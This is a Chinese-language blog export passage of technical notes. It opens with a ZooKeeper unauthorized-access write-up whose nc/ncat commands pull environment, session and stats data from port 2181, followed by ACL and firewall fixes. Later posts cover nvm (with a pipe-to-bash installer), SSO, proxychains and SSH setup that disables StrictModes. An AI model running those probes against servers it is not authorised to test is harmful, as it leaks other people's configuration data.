wget https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;zookeeper&#x2F;zookeeper-3.4.10&#x2F;zookeeper-3.4.10.tar.gz

tar -zxvf zookeepre-3.4.10.tar.gz
cd zookeeper-3.4.10&#x2F;
cd conf&#x2F;
vi zoo.cfg
### 配置单机模式
tickTime&#x3D;2000
dataDir&#x3D;&#x2F;tmp&#x2F;zookeeper&#x2F;data
dataLogDir&#x3D;&#x2F;tmp&#x2F;zookeeper&#x2F;logs
clientPort&#x3D;2181

bin&#x2F;zkServer.sh start   &#x2F;&#x2F;启动
### 启动client连接server
bin&#x2F;zkCli.sh -server localhost:2181

0x01 漏洞验证：执行以下命令即可远程获取该服务器的环境：echo envi|nc 192.168.15.74 2181
直接连接：./zkCli.sh -server ip:port
其他攻击获取信息stat：列出关于性能和连接的客户端的统计信息。echo stat |ncat 127.0.0.1 2181
ruok：测试服务器是否运行在非错误状态。echo ruok |ncat 127.0.0.1 2181
reqs：列出未完成的请求。echo reqs |ncat 127.0.0.1 2181
envi：打印有关服务环境的详细信息。echo envi |ncat 127.0.0.1 2181
dump：列出未完成的会话和临时节点。echo dump |ncat 127.0.0.1 2181
0x02 漏洞修复禁止把 Zookeeper 直接暴露在公网添加访问控制，根据情况选择对应方式（认证用户，用户名密码）
zookeeper 有三个端口（可以修改），默认端口作用：1、2181：对 cline 端提供服务2、3888：选举 leader 使用3、2888：集群内机器通讯使用（Leader 监听此端口）
修复办法 1 绑定指定 IP 访问 (推荐)：1、登陆 zookeeper
.&#x2F;zkCli.sh -server &lt;IP&gt;:&lt;port&gt;

2、查看当前权限：
getAcl &#x2F;

3、添加可访问 IP
setAcl &#x2F; ip:192.168.1.xx:cdrwa,ip:192.168.1.xx:cdrwa

4、查看是否正常添加
getAcl &#x2F;

未授权也可以连接，但是查看节点时会报错 &quot;KeeperErrorCode = NoAuth for /&quot;，localhost 都不行，必须填可访问 IP，才能访问。
[zk: localhost:2181(CONNECTED) 0] ls &#x2F;
KeeperErrorCode &#x3D; NoAuth for &#x2F;
[zk: localhost:2181(CONNECTED) 1]

回退办法：使用之前设置的 IP 进行访问：
.&#x2F;zkCli.sh -server &lt;IP&gt;:&lt;port&gt;

设置为所有人可访问：
setAcl &#x2F; world:anyone:cdrwa

修复办法 2 添加防火墙访问控制：配置防火墙策略，只允许指定 IP 访问 2181 端口。Linux 6：
iptables -I INPUT -p tcp --dport 2181 -j DROP
iptables -I INPUT -s 172.16.65.xx -p tcp --dport 2181 -j ACCEPT
iptables -I INPUT -s 172.16.65.xx -p tcp --dport 2181 -j ACCEPT
iptables -I INPUT -s 172.16.65.xx -p tcp --dport 2181 -j ACCEPT
service iptables save
service iptables restart
iptables -L

Linux 7:
firewall-cmd --zone&#x3D;public --remove-port&#x3D;2181&#x2F;tcp --permanent
firewall-cmd --permanent --add-rich-rule&#x3D;&quot;rule family&#x3D;&quot;ipv4&quot; source address&#x3D;&quot;192.0.2.181&quot; port protocol&#x3D;&quot;tcp&quot; port&#x3D;&quot;2181&quot; accept&quot;
firewall-cmd --reload
firewall-cmd --list-all

修复办法 3 设置身份验证（需要改程序）：为 ZooKeeper 配置相应的访问权限。
1）增加一个认证用户addauth digest 用户名: 密码明文
addauth digest user1:password1

2）设置权限setAcl /path auth: 用户名: 密码明文: 权限setAcl /path digest: 用户名: 密码密文: 权限
setAcl &#x2F;test auth:user1:password1:cdrwa

3）查看 Acl 设置
getAcl &#x2F;path

0x03 参考链接：ZooKeeper 未授权访问漏洞Linux 系统安全加固 - ZooKeeper 未授权访问漏洞处理ZooKeeper 未授权访问
]]></content>
      <tags>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>使用nvm管理不同版本的node与npm</title>
    <url>/2021/06/20/%E4%BD%BF%E7%94%A8nvm%E7%AE%A1%E7%90%86%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84node%E4%B8%8Enpm/</url>
    <content><![CDATA[
在我们的日常开发中经常会遇到这种情况：手上有好几个项目，每个项目的需求不同，进而不同项目必须依赖不同版的 NodeJS 运行环境。

使用 nvm 管理不同版本的 node 与 npm在我们的日常开发中经常会遇到这种情况：手上有好几个项目，每个项目的需求不同，进而不同项目必须依赖不同版的 NodeJS 运行环境。如果没有一个合适的工具，这个问题将非常棘手。
nvm 应运而生，nvm 是 Mac 下的 node 管理工具，有点类似管理 Ruby 的 rvm，如果需要管理 Windows 下的 node，官方推荐使用 nvmw 或 nvm-windows。不过，nvm-windows 并不是 nvm 的简单移植，他们也没有任何关系。但下面介绍的所有命令，都可以在 nvm-windows 中运行。


nvm 与 n 的区别node 版本管理工具还有一个是 TJ 大神的 n 命令，n 命令是作为一个 node 的模块而存在，而 nvm 是一个独立于 node/npm 的外部 shell 脚本，因此 n 命令相比 nvm 更加局限。
由于 npm 安装的模块路径均为 /usr/local/lib/node_modules，当使用 n 切换不同的 node 版本时，实际上会共用全局的 node/npm 目录。 因此不能很好的满足『按不同 node 版本使用不同全局 node 模块』的需求。
卸载全局安装的 node/npm在官网下载的 node 安装包，运行后会自动安装在全局目录，使用过程中经常会遇到一些权限问题，所以推荐按照以下方法卸载全局安装的 node/npm。
首先，打开你 Finder，按 shift+command+G，打开前往文件夹的窗口，分别输入下列目录进去之后删除 node 和 node_modules 相关的文件和文件夹:

  打开 /usr/local/lib，删除 node 和 node_modules 相关的文件和文件夹
  打开 /usr/local/include，删除 node 和 node_modules 相关的文件和文件夹
  如果你是使用的 brew install node 安装的 NodeJS，那么你还需要在终端中执行 brew uninstall node 命令来卸载
  检查你的个人主文件夹下面的所有的 local、lib 以及 include 文件夹，并且删除所有与 node 和 node_modules 相关的文件以及文件夹
  打开 /usr/local/bin 并删除 node 可执行文件

你可能还需要在你的终端中输入一些额外的指令：
sudo rm &#x2F;usr&#x2F;local&#x2F;bin&#x2F;npm
sudo rm &#x2F;usr&#x2F;local&#x2F;share&#x2F;man&#x2F;man1&#x2F;node.1
sudo rm &#x2F;usr&#x2F;local&#x2F;lib&#x2F;dtrace&#x2F;node.d
sudo rm -rf ~&#x2F;.npm
sudo rm -rf ~&#x2F;.node-gyp
sudo rm &#x2F;opt&#x2F;local&#x2F;bin&#x2F;node
sudo rm &#x2F;opt&#x2F;local&#x2F;include&#x2F;node
sudo rm -rf &#x2F;opt&#x2F;local&#x2F;lib&#x2F;node_modules

Windows 安装首先最重要的是：一定要卸载已安装的 NodeJS，否则会发生冲突。然后下载 nvm-windows 最新安装包，直接安装即可。
OS X/Linux 安装与 Windows 不同，我们并不一定要先卸载原有的 NodeJS。当然我们推荐还是先卸载掉比较好。另外，你还需要 C++ 编译器，Linux 发行版一般不用担心，像 Ubuntu 都可以直接用 build-essential 套件，OS X 的话，可以用 X-Code 的命令行工具。运行这个命令即可：
xcode-select --install

在 Linux 中：（如果是 Debian 发行版）
sudo apt-get install build-essential

然后我们可以使用
curl -o- https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;creationix&#x2F;nvm&#x2F;v0.33.0&#x2F;install.sh | bash

或者
wget -qO- https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;creationix&#x2F;nvm&#x2F;v0.33.0&#x2F;install.sh | bash

从远程下载 install.sh 脚本并执行。注意这个版本年数字 v0.33.0 会随着项目开发而变化。随时通过官方最新安装命令来检查最新安装版本是有好处的。
安装多版本 node/npm例如，我们要安装 4.2.2 版本，可以用如下命令：
nvm install 4.2.2

nvm 遵守语义化版本命名规则。例如，你想安装最新的 4.2 系列的最新的一个版本的话，可以运行：
nvm install 4.2

nvm 会寻找 4.2.x 中最高的版本来安装。
你可以通过以下命令来列出远程服务器上所有的可用版本：
nvm ls-remote

Windows 的话，就是：
nvm ls available

在不同版本间切换每当我们安装了一个新版本 Node 后，全局环境会自动把这个新版本设置为默认。
nvm 提供了 nvm use 命令。这个命令的使用方法和 install 命令类似。
例如，切换到 4.2.2：
nvm use 4.2.2

切换到最新的 4.2.x：
nvm use 4.2

切换到 iojs：
nvm use iojs-v3.2.0

切换到最新版：
nvm use node

每次执行切换的时候，系统都会把 node 的可执行文件链接放到特定版本的文件上。
我们还可以用 nvm 给不同的版本号设置别名：
nvm alias awesome-version 4.2.2

我们给 4.2.2 这个版本号起了一个名字叫做 awesome-version，然后我们可以运行：
nvm use awesome-version

下面这个命令可以取消别名：
nvm unalias awesome-version

另外，你还可以设置 default 这个特殊别名：
nvm alias default node

列出已安装实例nvm ls


上面绿色箭头是当前正在使用的版本，下面列出的还有设置过的别名。
在项目中使用不同版本的 Node我们可以通过创建项目目录中的 .nvmrc 文件来指定要使用的 Node 版本。之后在项目目录中执行 nvm use 即可。.nvmrc 文件内容只需要遵守上文提到的语义化版本规则即可。另外还有个工具叫做 avn，可以自动化这个过程。
在多环境中，npm 该如何使用呢？每个版本的 Node 都会自带一个不同版本的 npm，可以用 npm -v 来查看 npm 的版本。全局安装的 npm 包并不会在不同的 Node 环境中共享，因为这会引起兼容问题。它们被放在了不同版本的目录下，例如 ~/.nvm/versions/node//lib/node_modules 这样的目录。这刚好也省去我们在 Linux 中使用 sudo 的功夫了。因为这是用户的主文件夹，并不会引起权限问题。
但问题来了，我们安装过的 npm 包，都要重新再装一次？幸运的是，我们有个办法来解决我们的问题，运行下面这个命令，可以从特定版本导入到我们将要安装的新版本 Node：
nvm install v5.0.0 --reinstall-packages-from&#x3D;4.2

其他命令直接运行特定版本的 Node
nvm run 4.2.2 --version

在当前终端的子进程中运行特定版本的 Node
nvm exec 4.2.2 node --version

确认某个版本 Node 的路径
nvm which 4.2.2

安装 Node 的其他实现，例如 iojs（一个基于 ES6 的 Node 实现，现在已经和 Node 合并）
nvm install iojs-v3.2.0

快捷命令：

  nvm install node 安装最新版 Node
  nvm install iojs 安装最新版 iojs
  nvm install unstable 安装最新不稳定版本的 Node


原文链接：http://bubkoo.com/2017/01/08/quick-tip-multiple-versions-node-nvm/

]]></content>
      <tags>
        <tag>npm</tag>
        <tag>nvm</tag>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>几个Git仓库开源软件的比较</title>
    <url>/2021/06/16/%E5%87%A0%E4%B8%AAGit%E4%BB%93%E5%BA%93%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[


特性
gitlab
gitblit
gitbucket
gogs
gitolite



公开库
√
√
√
√
√


私有库
√
√
√
√
√


在线编辑
√
×
√
×
×


wiki
√
√
√
√
×


issue
√
√
√
√
×


fork
√
√
√
√
×


pull request
√
×
√
√
×


支持ssh
√
√
×
√
？


邮件通知
√
？
√
√
？


项目统计
√
×
√
√
×


组织管理
√
√
√
√
×


中文支持
×
√
×
√
×


权限控制
√
√
×
×
√


插件机制
√
√
√
√
×


系统资源要求
高
高
高
很低
低


方便安装
巨大不方便
单文件部署
单文件部署
单文件部署
未知


开发语言
ruby
java
scala
go
perl


项目历史（年）
?
5
3
2



开发者数量
?
97
80
196




如果你希望开展git仓库托管服务并且信任gitlab的实力，可以采用gitlab，不过中文化的工作量不小。
如果仅仅是小型团队的内部git仓库管理，gogs足够了。尽管缺少细致的权限控制，但是极低的资源占用，丰富的功能还是很吸引人的。而且，gogs的开发似乎很活跃，贡献人数也比较多。BTW，gogs项目是中国人创建的。
如果必须采用java部署，gitblit目前是不错的选择，但是gitblit缺少了pull request这个重量级的协作工具是一大遗憾。


转载：http://softlab.sdut.edu.cn/blog/subaochen/2016/01/github_like_softwares/

]]></content>
      <tags>
        <tag>Git仓库</tag>
      </tags>
  </entry>
  <entry>
    <title>前端请求下载文件的方式</title>
    <url>/2021/06/24/%E5%89%8D%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[使用 fetchfetch(&#39;&#x2F;&#x2F;xxx.xxx.com&#x2F;10.pdf&#39;, &#123;
    mode: &#39;cors&#39;
&#125;).then(res &#x3D;&gt; res.blob()).then(blob &#x3D;&gt; &#123;
    const blobURL &#x3D; window.URL.createObjectURL(blob)
    const link &#x3D; document.createElement(&#39;a&#39;)
    link.style.display &#x3D; &#39;none&#39;
    link.href &#x3D; blobURL
    link.setAttribute(&#39;download&#39;, decodeURI(&#39;10.pdf&#39;))
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
    window.URL.revokeObjectURL(blobURL)
&#125;)

使用封装好的 $http$http(&#123;
    &#x2F;&#x2F; 防止出现协议问题，这里不要写具体的 http 或者 https
    url: &#39;&#x2F;&#x2F;xxx.xxx.com&#x2F;10.pdf&#39;,
    headerType: &#39;download&#39;,
    method: &#39;get&#39;,
    &#x2F;&#x2F; 不指定默认从 content-disposition 头读取，后端接口也必须要设置 content-disposition 才能读取到
    fileName: &#39;download.docx&#39;
&#125;).then(res &#x3D;&gt; &#123;

&#125;)

window.open缺点：需要同域、可能会被拦截、浏览器支持预览的文件不会直接下载
window.open(&#39;&#x2F;&#x2F;xxx.xxx.com&#x2F;10.pdf&#39;)

form 表单提交缺点：浏览器支持预览的文件不会直接下载
export function download (url, params &#x3D; &#123;&#125;) &#123;
    const form &#x3D; document.createElement(&#39;form&#39;)
    form.method &#x3D; &#39;post&#39;
    form.action &#x3D; url
    form.target &#x3D; &#39;_blank&#39;
    document.body.appendChild(form)
    for (const key in params) &#123;
        const value &#x3D; params[key]
        if (value) &#123;
            const input &#x3D; document.createElement(&#39;input&#39;)
            input.setAttribute(&#39;type&#39;, &#39;hidden&#39;)
            input.setAttribute(&#39;name&#39;, key)
            if (isArray(value)) &#123;
                input.setAttribute(&#39;value&#39;, stringify(value))
            &#125; else &#123;
                input.setAttribute(&#39;value&#39;, value)
            &#125;
            form.appendChild(input)
        &#125;
    &#125;
    form.submit()
    document.body.removeChild(form)
&#125;

a 标签触发缺点：可能会被拦截、浏览器支持预览的文件不会直接下载
const link &#x3D; document.createElement(&#39;a&#39;)
link.style.display &#x3D; &#39;none&#39;
link.href &#x3D; &#39;&#x2F;&#x2F;xxx.xxx.com&#x2F;10.pdf&#39;
link.setAttribute(&#39;download&#39;, decodeURI(&#39;10.pdf&#39;))
document.body.appendChild(link)
link.click()
document.body.removeChild(link)


 1 和 2 的方式，无论什么文件都是执行下载

]]></content>
  </entry>
  <entry>
    <title>单点登录（SSO）</title>
    <url>/2021/06/10/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%EF%BC%88SSO%EF%BC%89/</url>
    <content><![CDATA[产生背景在企业发展初期，企业使用的系统很少，通常一个或者两个，每个系统都有自己的登录模块，运营人员每天用自己的账号登录，很方便。 但随着企业的发展，用到的系统随之增多，运营人员在操作不同的系统时，需要多次登录，而且每个系统的账号都不一样，这对于运营人员来说，很不方便。于是，就想到是不是可以在一个系统登录，其他系统就不用登录了呢？这就是单点登录要解决的问题。


简介单点登录英文全称 Single Sign On，简称就是 SSO。它的解释是：在多个应用系统中，只需要登录一次，就可以访问其他相互信任的应用系统。

如图所示，图中有 4 个系统，分别是 Application1、Application2、Application3、和 SSO。Application1、Application2、Application3 没有登录模块，而 SSO 只有登录模块，没有其他的业务模块，当 Application1、Application2、Application3 需要登录时，将跳到 SSO 系统，SSO 系统完成登录，其他的应用系统也就随之登录了。这完全符合我们对单点登录（SSO）的定义。
在说单点登录（SSO）的技术实现之前，我们先说一说普通的登录认证机制 。
如上图所示，我们在浏览器（Browser）中访问一个应用，这个应用需要登录，我们填写完用户名和密码后，完成登录认证。这时，我们在这个用户的 session 中标记登录状态为 yes（已登录），同时在浏览器（Browser）中写入 Cookie，这个 Cookie 是这个用户的唯一标识。下次我们再访问这个应用的时候，请求中会带上这个 Cookie，服务端会根据这个 Cookie 找到对应的 session，通过 session 来判断这个用户是否登录。如果不做特殊配置，这个 Cookie 的名字叫做 jsessionid，值在服务端（server）是唯一的。
同域下的单点登录一个企业一般情况下只有一个域名，通过二级域名区分不同的系统。比如我们有个域名叫做：a.com，同时有两个业务系统分别为：app1.a.com 和 app2.a.com。我们要做单点登录（SSO），需要一个登录系统，叫做：sso.a.com。
我们只要在 sso.a.com 登录，app1.a.com 和 app2.a.com 就也登录了。通过上面的登陆认证机制，我们可以知道，在 sso.a.com 中登录了，其实是在 sso.a.com 的服务端的 session 中记录了登录状态，同时在浏览器端（Browser）的 sso.a.com 下写入了 Cookie。那么我们怎么才能让 app1.a.com 和 app2.a.com 登录呢？这里有两个问题：

  Cookie 是不能跨域的，我们 Cookie 的 domain 属性是 sso.a.com，在给 app1.a.com 和 app2.a.com 发送请求是带不上的。
  sso、app1 和 app2 是不同的应用，它们的 session 存在自己的应用内，是不共享的。


那么我们如何解决这两个问题呢？针对第一个问题，sso 登录以后，可以将 Cookie 的域设置为顶域，即. a.com，这样所有子域的系统都可以访问到顶域的 Cookie。我们在设置 Cookie 时，只能设置顶域和自己的域，不能设置其他的域。比如：我们不能在自己的系统中给 baidu.com 的域设置 Cookie。
Cookie 的问题解决了，我们再来看看 session 的问题。我们在 sso 系统登录了，这时再访问 app1，Cookie 也带到了 app1 的服务端（Server），app1 的服务端怎么找到这个 Cookie 对应的 Session 呢？这里就要把 3 个系统的 Session 共享，如图所示。共享 Session 的解决方案有很多，例如：Spring-Session。这样第 2 个问题也解决了。
同域下的单点登录就实现了，但这还不是真正的单点登录。
不同域下的单点登录同域下的单点登录是巧用了 Cookie 顶域的特性。如果是不同域呢？不同域之间 Cookie 是不共享的，怎么办？
这里我们就要说一说 CAS 流程了，这个流程是单点登录的标准流程。
上图是 CAS 官网上的标准流程，具体流程如下：

 用户访问 app 系统，app 系统是需要登录的，但用户现在没有登录。
 跳转到 CAS server，即 SSO 登录系统，以后图中的 CAS Server 我们统一叫做 SSO 系统。 SSO 系统也没有登录，弹出用户登录页。
 用户填写用户名、密码，SSO 系统进行认证后，将登录状态写入 SSO 的 session，浏览器（Browser）中写入 SSO 域下的 Cookie。
 SSO 系统登录完成后会生成一个 ST（Service Ticket），然后跳转到 app 系统，同时将 ST 作为参数传递给 app 系统。
 app 系统拿到 ST 后，从后台向 SSO 发送请求，验证 ST 是否有效。
 验证通过后，app 系统将登录状态写入 session 并设置 app 域下的 Cookie。

至此，跨域单点登录就完成了。以后我们再访问 app 系统时，app 就是登录的。接下来，我们再看看访问 app2 系统时的流程。

 用户访问 app2 系统，app2 系统没有登录，跳转到 SSO。
 由于 SSO 已经登录了，不需要重新登录认证。
 SSO 生成 ST，浏览器跳转到 app2 系统，并将 ST 作为参数传递给 app2。
 app2 拿到 ST，后台访问 SSO，验证 ST 是否有效。
 验证成功后，app2 将登录状态写入 session，并在 app2 域下写入 Cookie。

这样，app2 系统不需要走登录流程，就已经是登录了。SSO，app 和 app2 在不同的域，它们之间的 session 不共享也是没问题的。
有的同学问我，SSO 系统登录后，跳回原业务系统时，带了个参数 ST，业务系统还要拿 ST 再次访问 SSO 进行验证，觉得这个步骤有点多余。他想 SSO 登录认证通过后，通过回调地址将用户信息返回给原业务系统，原业务系统直接设置登录状态，这样流程简单，也完成了登录，不是很好吗？
其实这样问题时很严重的，如果我在 SSO 没有登录，而是直接在浏览器中敲入回调的地址，并带上伪造的用户信息，是不是业务系统也认为登录了呢？这是很可怕的。
单点登录（SSO）的所有流程都介绍完了，原理大家都清楚了。总结一下单点登录要做的事情：

  单点登录（SSO 系统）是保障各业务系统的用户资源的安全 。
  各个业务系统获得的信息是，这个用户能不能访问我的资源。
  单点登录，资源都在各个业务系统这边，不在 SSO 那一方。 用户在给 SSO 服务器提供了用户名密码后，作为业务系统并不知道这件事。 SSO 随便给业务系统一个 ST，那么业务系统是不能确定这个 ST 是用户伪造的，还是真的有效，所以要拿着这个 ST 去 SSO 服务器再问一下，这个用户给我的 ST 是否有效，是有效的我才能让这个用户访问。


系统a要退出登录时，重定向到sso系统，去掉sso系统的cookie，再去掉用户会话，系统a再去掉本地cookie，系统a就退出登录了。
系统b再访问的时候因sso系统没有cookie，并且没有用户会话，那么也就可以让系统b退出登录了。


转载：https://developer.aliyun.com/article/636281

]]></content>
      <tags>
        <tag>SSO</tag>
      </tags>
  </entry>
  <entry>
    <title>好用的Linux命令</title>
    <url>/2021/07/03/%E5%A5%BD%E7%94%A8%E7%9A%84Linux%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[ripgrep 是一个面向行的搜索工具英文原版   https://github.com/BurntSushi/ripgrep中文fork版 https://github.com/chinanf-boy/ripgrep-zh
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机走主机代理</title>
    <url>/2021/03/26/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%B5%B0%E4%B8%BB%E6%9C%BA%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[情况1 代理软件开放代理端口，虚拟机通过该端口进行代理
Linux安装proxychains
git clone https:&#x2F;&#x2F;github.com&#x2F;rofl0r&#x2F;proxychains-ng.git

cd proxychains-ng

.&#x2F;configure
make
make install
make install-config

# make install-config 执行完毕后会输出配置文件的存放路径

# 如果提示make: Nothing to be done for &#96;all&#96;，可以尝试执行
make clean
配置conf
vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;proxychains.conf

# 根据代理软件具体开放的协议类型，配置代理ip和port

http    本机ip 代理port
socks5  本机ip 代理port
Windows配置端口转发
netsh interface portproxy add v4tov4 listenport&#x3D;转发端口 listenaddress&#x3D;监听地址 connectport&#x3D;转发端口 connectaddress&#x3D;转发地址

# 举例
netsh interface portproxy add v4tov4 listenport&#x3D;64601 listenaddress&#x3D;192.168.100.153 connectport&#x3D;64601 connectaddress&#x3D;127.0.0.1

netsh interface portproxy show all

# 查看端口转发列表
侦听 ipv4:                 连接到 ipv4:

地址            端口        地址            端口
--------------- ----------  --------------- ----------
192.168.100.153 64601       127.0.0.1       64601
添加防火墙入站规则，开放代理端口，为了虚拟机可以访问到本机ip+端口port

测试虚拟机是否可以走代理访问
proxychains telnet google.com

]]></content>
      <tags>
        <tag>虚拟机</tag>
        <tag>VMware</tag>
        <tag>VirutalBox</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次JS中解决浮点数计算问题</title>
    <url>/2021/06/21/%E8%AE%B0%E4%B8%80%E6%AC%A1JS%E4%B8%AD%E8%A7%A3%E5%86%B3%E6%B5%AE%E7%82%B9%E6%95%B0%E8%AE%A1%E7%AE%97%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[问题：1.2 - 1.1 = 0.09999999999999987

为什么结果如此就不赘述了，浮点数在计算机中存储原理了解一下。

解决办法：使用第三方类库

big.js
decimal.js

原理了解：https://juejin.cn/post/6900567809038745608
]]></content>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次重装系统</title>
    <url>/2021/03/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[这次重装系统（为何要重装有兴趣的可翻看上上篇）我是一万个不愿意的，因为我知道系统重装的成本有多大。就单纯装个系统来说可能只需要十几分钟，但是装系统前的准备工作（主要是备份和制作安装启动 U 盘）以及系统装完后的恢复备份、软件安装调试、系统设置等，要想完全恢复之前的使用环境，差不多得需要一天的时间。现在是晚上的 10:42，先记录下该做的一些工作，按步骤来就不会出错。


准备工作安装 U 盘使用 Windows Media Creation Tool 制作安装 U 盘 —&gt; 完成
文件备份桌面文件。右键选中桌面文件夹，在属性中将文件移动到其他盘 —&gt; 未完成
备份文档文件，参照上述方法 —&gt; 未完成
用户目录下的一些 dotfile 如 ssh 密钥、gpg 密钥和配置文件等 —&gt; 未完成
驱动从官网下载驱动 —&gt; 完成
统计安装软件按上次重装系统后软件安装顺序排序如下：
✅ 已安装 - 谷歌浏览器 —&gt; 下载万物，当然得先用 IE/Edge 下载它
✅ 已安装 - 微信
✅ 已安装 - 坚果云 —&gt; 论文同步
❌ 未安装 - Zoommy —&gt; 貌似万年没打开过了
✅ 已安装 - TIM
✅ 已安装 - EndNote X8 —&gt; 文献管理，白嫖的中科大授权，严格意义上的盗版
✅ 已安装 - Tableau —&gt; 向官方申请的教育授权，本地反激活完成
✅ 已安装 - 火狐浏览器
✅ 已安装 - JetBrains Toolbox —&gt; 向官方申请的教育授权，无需反激活
✅ 已安装 - 1Password —&gt; 别忘记主密码
✅ 已安装 - R
✅ 已安装 - RStudio
❌ 未安装 - Fences —&gt; 购买的正版密钥，本地反激活完成
✅ 已安装 - Listary —&gt; 购买的正版密钥，无法 / 不需反激活
✅ 已安装 - Internet Download Manager —&gt; 购买的正版密钥，无法 / 不需反激活
✅ 已安装 - Notion —&gt; 通过 Scoop 安装
✅ 已安装 - MATLAB —&gt; 学校购买授权，帐号登录
✅ 已安装 - Navicat —&gt; 学校邮箱申请密钥，反激活完成
✅ 已安装 - Axure —&gt; 教育授权，本地反激活完成
✅ 已安装 - MS Office 家庭和学生版 2016 —&gt; 购买机器附送的，绑定账号
✅ 已安装 - 幕布 —&gt; 通过 Scoop 安装
✅ 已安装 - 印象笔记 —&gt; 登录国内和国际版两个账号
✅ 已安装 - MindManager
✅ 已安装 - PicGo —&gt; 通过 Scoop 安装
✅ 已安装 - MS Visio 专业版 2019 —&gt; 购买，绑定账号
✅ 已安装 - WinRAR
✅ 已安装 - Python 3.7 —&gt; 不要装 3.8，无法正常运行 Jupyter Notebook
❌ 未安装 - XMeters —&gt; 购买的正版密钥，无法 / 不需反激活 —&gt; 先不装了
✅ 已安装 - PotPlayer —&gt; 竟然被 Scoop extras bucket 收录了
✅ 已安装 - ManicTime —&gt; 购买的正版密钥，本地反激活完成
✅ 已安装 - Rtools
✅ 已安装 - Spotify
✅ 已安装 - TeX Live —&gt; 配置文件还原
安装系统最简单，略过，选项该关闭该保留全凭个人喜好
不过有一点要记住，安装时先创建一个本地账户而不要登录微软账号，否则用户文件夹名会恶心你
恢复工作
驱动安装 —&gt; 可选，看看官网有没有适配最新系统的驱动发布
备份文件恢复 —&gt; 移动文件
安装软件 —&gt; 无尽的下载…… 下载…… 载…… 想到 MATLAB 和 TeX Live 就头疼
环境变量设置 —&gt; 绝大部分交由 Scoop 完成，剩余的软件安装过程中就可做到
自定义 DNS —&gt; 可选
一些软件设置，如语言工具设置国内镜像源

现在已经凌晨 12:18 了，明天继续。
实际安装步骤及观察
安装完系统后，联网，等待一段时间，自动安装驱动及补丁
修改设备名称后，重启
通过蓝牙连接鼠标和键盘
解决英文操作系统下中文乱码问题：Control Panel - Clock and Region - Region - Administrative - Language for non-Unicode programs，将其改为简体中文即可
登录微软账号同步设置和 OneDrive 文件，先进行简单设置和覆盖原有设置，如去掉固定在任务栏的快捷图标，将默认输入语言设置为中文、默认应用语言和系统显示语言设置为英文
安装 Scoop，参考的是之前写的 Scoop 不完全上手指南。安装完后，用户文件夹下多了一个 .config 文件夹，里面有 Scoop 的配置文件
先通过 Scoop 安装 shadowsocksr-csharp，前提是添加 extras bucket，而添加 extras bucket 的前提是安装 git 和 7zip。这一过程是异常痛苦的，网络环境并不太好，只能看着下载进度条慢慢地走……
垃圾小米笔记本，安装 git 时自动休眠睡死了，转向处理这一问题的 bug 分支。
初步判断是集成显卡驱动问题并不是，可能跟主板芯片和电池管理驱动有关，所以老老实实把所有驱动打了一遍。为了加快驱动下载速度，安装 Internet Download Manager，而密钥存储在 1Password 中，先下载安装 1P 。
安装 git 后，将原来的 .gitconfig 文件复制到用户目录下覆盖新生成的配置文件
安装完谷歌浏览器后，登录账号同步设置及插件，复制机场的订阅地址到小飞机，开启飞行模式
之前通过 Scoop 安装的一些软件虽然可以无损迁移恢复使用，但最终还是决定全部重装一遍，完整记录下来。
Scoop install：adb | android-sdk | anki | annie | aria2 | autohotkey | blender | bluescreenview | captura | chromedriver | concfg | curl | dark | dropit | everything | ffmpeg | figlet | fork | geckodriver | geekuninstaller | gimp | gpg | graphviz | honeyview | hugo | inkscape | joplin | lessmsi | motrix | msys2 | neovim | nodejs-lts | nvm | openjdk13 | openshot | pandoc | pandownload | php | proxifier-portable | pshazz | racket | screentogif | sharex | sqlite | sudo | sumatrapdf | telegram | time | touch | v2ray | v2rayn | vnote | vscode | which | winscp | yarn | youtube-dl | zotero
go 改为手动安装
将之前备份的文件还原回去
之后就剩一些「大块头」的软件以及收尾工作
最后就是系统设置
done


转载说明：

本文作者： Zheng Shuai
本文链接： https://www.iamzs.top/archives/the-price-of-windows-reinstallation.html


]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>重装系统</tag>
      </tags>
  </entry>
  <entry>
    <title>配置免密登录linux</title>
    <url>/2021/02/01/%E9%85%8D%E7%BD%AE%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95linux/</url>
    <content><![CDATA[Windows切换到git环境下
没有git环境的，自行百度安装
# 切换目录
cd ~&#x2F;.ssh

# 新建config文件
vim config

# 输入以下内容
Host centos # 自定义, 用于后续的免密登录
HostName 192.168.117.29 # 服务器地址ip
User root # 登录的用户名
Port 22 # 端口
IdentityFile ~&#x2F;.ssh&#x2F;id_rsa # 私钥路径, id_rsa.pub是公钥

# 生成密钥对, 可以自行指定文件名, 默认为id_rsa和id_rsa.pub
ssh-keygen

# 发送id_rsa.pub文件至Linux服务器上
scp id_rsa.pub 用户名@ip:&#x2F;home&#x2F;

# 登录Linux服务器后, 进行操作
mv &#x2F;home&#x2F;id_rsa.pub ~&#x2F;.ssh&#x2F;authorized_keys

# 修改sshd_config配置, 确保以下几项配置前面没有#字符
vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config

StrictModes no
RSAAuthentication yes # 如果没有就自己加上
PubkeyAuthentication yes
